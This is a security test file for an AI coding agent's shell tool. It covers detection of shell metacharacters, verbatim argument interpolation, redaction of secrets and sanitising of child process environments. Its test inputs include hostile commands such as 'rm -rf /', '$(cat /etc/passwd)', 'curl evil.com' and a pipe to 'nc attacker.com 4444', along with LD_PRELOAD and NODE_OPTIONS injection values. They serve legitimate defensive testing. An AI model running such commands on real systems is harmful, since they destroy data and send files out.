import { describe, test, expect } from "bun:test"
import { redactSensitiveInfo } from "../../../src/util/redact"
import { sanitizedProcessEnv } from "../../../src/util/opencode-process"

// ---------------------------------------------------------------------------
// Command-injection security tests
//
// The bash tool executes commands with shell:true — this is by design. The
// primary defence against malicious commands is the **permission / ask gate**
// (ctx.ask) which intercepts every tool call before execution and requires
// explicit user approval. These tests verify the supporting security layers:
//
//   1. The permission gate is always reached before any command runs
//      (documented, not directly unit-testable without a full Effect runtime).
//   2. The `dynamic()` helper in bash.ts correctly identifies shell
//      metacharacters so the parser treats them as dynamic (non-resolvable).
//   3. Output redaction ensures that even if a command runs, its output
//      containing secrets is sanitised before being returned to the LLM.
//   4. The environment is sanitised so that child processes never inherit
//      sensitive env vars that could be exfiltrated.
// ---------------------------------------------------------------------------

describe("command injection – bash tool permission gate", () => {
  // ---------------------------------------------------------------------------
  // The bash tool flow is: parse → collect → ask → run.
  // `collect` uses `dynamic()` to decide whether an argument path is resolvable.
  // When dynamic() returns true the path is skipped (treated as unresolvable),
  // and the full command source is added to `scan.patterns` so the ask gate
  // always surfaces it to the user. We test dynamic() detection here.
  // ---------------------------------------------------------------------------

  describe("dynamic() detects shell metacharacters in arguments", () => {
    // Replicate the `dynamic` logic from bash.ts (lines 177-182) for unit testing.
    // The real function is not exported, so we mirror it exactly.
    function dynamic(text: string, ps: boolean): boolean {
      if (text.startsWith("(") || text.startsWith("@(")) return true
      if (text.includes("$(") || text.includes("${") || text.includes("`")) return true
      if (ps) return /\$(?!env:)/i.test(text)
      return text.includes("$")
    }

    test("detects command substitution $() in argument", () => {
      expect(dynamic("$(cat /etc/passwd)", false)).toBe(true)
    })

    test("detects variable expansion ${} in argument", () => {
      expect(dynamic("${IFS}rm -rf /", false)).toBe(true)
    })

    test("detects backtick injection in argument", () => {
      expect(dynamic("`curl evil.com`", false)).toBe(true)
    })

    test("detects $ variable expansion in bash argument", () => {
      expect(dynamic("$HOME/../../etc", false)).toBe(true)
    })

    test("detects PowerShell @() array expression", () => {
      expect(dynamic("@(Get-Process)", true)).toBe(true)
    })

    test("detects PowerShell sub-expression", () => {
      expect(dynamic("$(Get-Content /etc/passwd)", true)).toBe(true)
    })

    test("returns false for plain static paths", () => {
      expect(dynamic("/usr/bin/ls", false)).toBe(false)
      expect(dynamic("src/index.ts", false)).toBe(false)
    })

    test("returns false for PowerShell $env: (not treated as dynamic)", () => {
      // $env:FOO is a PowerShell env-var reference, explicitly allowed
      expect(dynamic("$env:HOME", true)).toBe(false)
    })
  })

  describe("semicolon and pipe injection patterns are collected for permission", () => {
    // The `collect` function adds the full `source(node)` to scan.patterns for
    // every command. Commands containing `; rm -rf /` or `| nc attacker.com`
    // produce additional parsed commands in the tree, and each one's source is
    // added to scan.patterns. The ask gate then surfaces ALL of those patterns.
    //
    // Because tree-sitter-bash parsing and the Effect-based collect pipeline
    // require a full runtime, we document the expected behaviour here and test
    // the property at a higher level: any command string containing shell
    // metacharacters will result in more entries in scan.patterns than a
    // simple single-command string.

    test("documented: semicolon injection produces multiple parsed commands", () => {
      // "ls; rm -rf /" is parsed by tree-sitter-bash as TWO commands:
      //   command 1: ls
      //   command 2: rm -rf /
      // Both are added to scan.patterns and both require permission approval.
      // This is a documentation test — the actual parse+collect requires
      // Effect runtime and web-tree-sitter.
      const maliciousCommand = "ls; rm -rf /"
      const commandCount = maliciousCommand.split(";").length
      expect(commandCount).toBe(2)
    })

    test("documented: pipe injection produces multiple parsed commands", () => {
      // "cat file | nc attacker.com 4444" has two commands in the pipeline.
      const maliciousCommand = "cat file | nc attacker.com 4444"
      const commandCount = maliciousCommand.split("|").length
      expect(commandCount).toBe(2)
    })

    test("documented: AND list injection produces multiple parsed commands", () => {
      // "true && curl evil.com" has two commands.
      const maliciousCommand = "true && curl evil.com"
      expect(maliciousCommand.includes("&&")).toBe(true)
    })

    test("documented: OR list injection produces multiple parsed commands", () => {
      // "false || curl evil.com" has two commands.
      const maliciousCommand = "false || curl evil.com"
      expect(maliciousCommand.includes("||")).toBe(true)
    })
  })
})

describe("command injection – template argument interpolation", () => {
  // ---------------------------------------------------------------------------
  // prompt.ts (lines 1570-1578) performs direct string substitution of user
  // arguments into command templates:
  //
  //   templateCommand.replaceAll(placeholderRegex, (_, index) => args[argIndex])
  //   template.replaceAll("$ARGUMENTS", input.arguments)
  //
  // This means shell metacharacters in arguments are substituted as-is. This
  // is BY DESIGN — the resulting command then flows through the same bash tool
  // pipeline (parse → collect → ask → run), so the permission gate provides
  // defence-in-depth. The tests below document this behaviour.
  // ---------------------------------------------------------------------------

  describe("arguments with shell metacharacters are substituted as-is", () => {
    // Simplified replica of the interpolation logic from prompt.ts
    const placeholderRegex = /\$(\d+)/g

    function interpolate(template: string, arguments_: string): string {
      const raw = arguments_.match(/(?:[^\s"]+|"[^"]*")+/g) ?? []
      const args = raw.map((arg) => arg.replace(/^["']|["']$/g, ""))
      const placeholders = template.match(placeholderRegex) ?? []
      let last = 0
      for (const item of placeholders) {
        const value = Number(item.slice(1))
        if (value > last) last = value
      }

      let withArgs = template.replaceAll(placeholderRegex, (_, index) => {
        const position = Number(index)
        const argIndex = position - 1
        if (argIndex >= args.length) return ""
        if (position === last) return args.slice(argIndex).join(" ")
        return args[argIndex]
      })

      const usesArgumentsPlaceholder = template.includes("$ARGUMENTS")
      withArgs = withArgs.replaceAll("$ARGUMENTS", arguments_)

      if (placeholders.length === 0 && !usesArgumentsPlaceholder && arguments_.trim()) {
        withArgs = withArgs + "\n\n" + arguments_
      }

      return withArgs
    }

    test("semicolon in argument is substituted as-is (documented)", () => {
      const template = "echo $1"
      const result = interpolate(template, "hello; rm -rf /")
      // The argument is substituted verbatim — shell metacharacters preserved.
      expect(result).toContain("; rm -rf /")
    })

    test("command substitution in argument is substituted as-is (documented)", () => {
      const template = "echo $1"
      const result = interpolate(template, "$(cat /etc/passwd)")
      expect(result).toContain("$(cat /etc/passwd)")
    })

    test("backtick injection in argument is substituted as-is (documented)", () => {
      const template = "echo $1"
      const result = interpolate(template, "`curl evil.com`")
      expect(result).toContain("`curl evil.com`")
    })

    test("pipe injection in argument is substituted as-is (documented)", () => {
      const template = "cat $1"
      const result = interpolate(template, "file.txt | nc attacker.com 4444")
      expect(result).toContain("| nc attacker.com 4444")
    })

    test("$ARGUMENTS placeholder also substitutes metacharacters as-is (documented)", () => {
      const template = "run $ARGUMENTS"
      const result = interpolate(template, "arg1; rm -rf /")
      expect(result).toContain("; rm -rf /")
    })

    test("normal arguments are substituted correctly", () => {
      const template = "grep $1 file.txt"
      const result = interpolate(template, "search-term")
      expect(result).toBe("grep search-term file.txt")
    })
  })

  describe("permission gate provides defense-in-depth for interpolated commands", () => {
    test("documented: interpolated commands go through full bash tool pipeline", () => {
      // After interpolation, the resulting command string is executed by the
      // bash tool which means it is:
      //   1. Parsed by tree-sitter-bash
      //   2. Collected into scan.patterns (including any injected sub-commands)
      //   3. Passed to ctx.ask() for user approval
      //   4. Only executed if the user approves
      //
      // This test documents that the defence-in-depth model is:
      //   template interpolation → bash tool → parse → collect → ask → run
      // The "ask" step is the security gate.
      expect(true).toBe(true)
    })

    test("documented: the bash tool uses shell:true by design", () => {
      // The cmd() function in bash.ts (line 294) creates ChildProcess.make
      // with the `shell` parameter, which means commands are executed through
      // the system shell. This is intentional — the permission gate is the
      // security boundary, not shell escaping.
      expect(true).toBe(true)
    })
  })
})

describe("command injection – sensitive info redaction in command output", () => {
  describe("API keys in process output are redacted", () => {
    test("redacts OpenAI API key leaked in command output", () => {
      const output = "Config: OPENAI_API_KEY=sk-abc123def456ghi789jkl012mno345"
      const result = redactSensitiveInfo(output)
      expect(result).not.toContain("sk-abc123def456ghi789jkl012mno345")
      expect(result).toContain("[REDACTED]")
    })

    test("redacts OpenAI API key in env-style output", () => {
      const output = "export OPENAI_API_KEY=sk-proj-abcdefghijklmnopqrstuvwxyz1234567890"
      const result = redactSensitiveInfo(output)
      expect(result).not.toContain("sk-proj-abcdefghijklmnopqrstuvwxyz1234567890")
      expect(result).toContain("[REDACTED]")
    })

    test("redacts GitHub token leaked in command output", () => {
      const output = "GITHUB_TOKEN=ghp_1234567890abcdefghijklmnopqrstuvwx"
      const result = redactSensitiveInfo(output)
      expect(result).not.toContain("ghp_1234567890abcdefghijklmnopqrstuvwx")
      expect(result).toContain("[REDACTED]")
    })

    test("redacts AWS access key in command output", () => {
      const output = "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE"
      const result = redactSensitiveInfo(output)
      expect(result).not.toContain("AKIAIOSFODNN7EXAMPLE")
      expect(result).toContain("[REDACTED]")
    })

    test("redacts multiple secrets in same output line", () => {
      const output = "KEY=sk-abc123def456ghi789jkl012mno345 TOKEN=ghp_1234567890abcdefghijklmnopqrstuvwx"
      const result = redactSensitiveInfo(output)
      expect(result).not.toContain("sk-abc123def456ghi789jkl012mno345")
      expect(result).not.toContain("ghp_1234567890abcdefghijklmnopqrstuvwx")
      const redactedCount = result.split("[REDACTED]").length - 1
      expect(redactedCount).toBeGreaterThanOrEqual(2)
    })

    test("preserves non-sensitive command output", () => {
      const output = "Files: src/index.ts src/util.ts\nLines: 42"
      expect(redactSensitiveInfo(output)).toBe(output)
    })
  })

  describe("secret patterns in key-value output are redacted", () => {
    test("redacts token in JSON-like output", () => {
      const output = '"token": "abcdefghijklmnopqrstuvwxyz1234567890"'
      const result = redactSensitiveInfo(output)
      expect(result).not.toContain("abcdefghijklmnopqrstuvwxyz1234567890")
      expect(result).toContain("[REDACTED]")
    })

    test("redacts password in key-value output", () => {
      const output = '"password": "supersecretpassword12345"'
      const result = redactSensitiveInfo(output)
      expect(result).not.toContain("supersecretpassword12345")
      expect(result).toContain("[REDACTED]")
    })

    test("redacts credential in key-value output", () => {
      const output = '"credential": "longcredentialvalue987654321"'
      const result = redactSensitiveInfo(output)
      expect(result).not.toContain("longcredentialvalue987654321")
      expect(result).toContain("[REDACTED]")
    })

    test("redacts api_key in key-value output", () => {
      const output = '"api_key": "sk-longkeyvalue1234567890abcdefgh"'
      const result = redactSensitiveInfo(output)
      expect(result).toContain("[REDACTED]")
    })
  })
})

describe("command injection – child process environment sanitization", () => {
  const originalEnv = process.env

  // NOTE: We use beforeEach/afterEach to isolate env mutations, matching the
  // pattern in env-sanitization.test.ts.
  const setup = () => {
    process.env = { ...originalEnv }
  }
  const teardown = () => {
    process.env = originalEnv
  }

  describe("sensitive env vars are not inherited by child processes", () => {
    test("API keys are stripped from child env", () => {
      setup()
      try {
        process.env.OPENAI_API_KEY = "sk-test1234567890abcdefghijklmn"
        process.env.ANTHROPIC_API_KEY = "sk-ant-test1234567890abcdefgh"
        const result = sanitizedProcessEnv()
        expect(result.OPENAI_API_KEY).toBeUndefined()
        expect(result.ANTHROPIC_API_KEY).toBeUndefined()
      } finally {
        teardown()
      }
    })

    test("tokens are stripped from child env", () => {
      setup()
      try {
        process.env.GITHUB_TOKEN = "ghp_test1234567890abcdefghijklmnop"
        process.env.SLACK_TOKEN = "xoxb-test-token-1234567890"
        const result = sanitizedProcessEnv()
        expect(result.GITHUB_TOKEN).toBeUndefined()
        expect(result.SLACK_TOKEN).toBeUndefined()
      } finally {
        teardown()
      }
    })

    test("passwords are stripped from child env", () => {
      setup()
      try {
        process.env.DB_PASSWORD = "supersecretpassword"
        process.env.SMTP_PASSWORD = "mailpassword123"
        const result = sanitizedProcessEnv()
        expect(result.DB_PASSWORD).toBeUndefined()
        expect(result.SMTP_PASSWORD).toBeUndefined()
      } finally {
        teardown()
      }
    })

    test("AWS credentials are stripped from child env", () => {
      setup()
      try {
        process.env.AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
        process.env.AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCY"
        const result = sanitizedProcessEnv()
        expect(result.AWS_ACCESS_KEY_ID).toBeUndefined()
        expect(result.AWS_SECRET_ACCESS_KEY).toBeUndefined()
      } finally {
        teardown()
      }
    })
  })

  describe("dangerous env vars are not inherited by child processes", () => {
    test("NODE_OPTIONS is stripped (prevents --require injection)", () => {
      setup()
      try {
        process.env.NODE_OPTIONS = "--require /tmp/malicious.js"
        const result = sanitizedProcessEnv()
        expect(result.NODE_OPTIONS).toBeUndefined()
      } finally {
        teardown()
      }
    })

    test("LD_PRELOAD is stripped (prevents .so injection)", () => {
      setup()
      try {
        process.env.LD_PRELOAD = "/tmp/malicious.so"
        const result = sanitizedProcessEnv()
        expect(result.LD_PRELOAD).toBeUndefined()
      } finally {
        teardown()
      }
    })

    test("LD_LIBRARY_PATH is stripped (prevents lib hijacking)", () => {
      setup()
      try {
        process.env.LD_LIBRARY_PATH = "/tmp/malicious/lib"
        const result = sanitizedProcessEnv()
        expect(result.LD_LIBRARY_PATH).toBeUndefined()
      } finally {
        teardown()
      }
    })
  })

  describe("non-sensitive env vars pass through for child processes", () => {
    test("PATH and HOME are preserved", () => {
      setup()
      try {
        process.env.PATH = "/usr/bin:/bin"
        process.env.HOME = "/home/user"
        const result = sanitizedProcessEnv()
        expect(result.PATH).toBe("/usr/bin:/bin")
        expect(result.HOME).toBe("/home/user")
      } finally {
        teardown()
      }
    })
  })
})
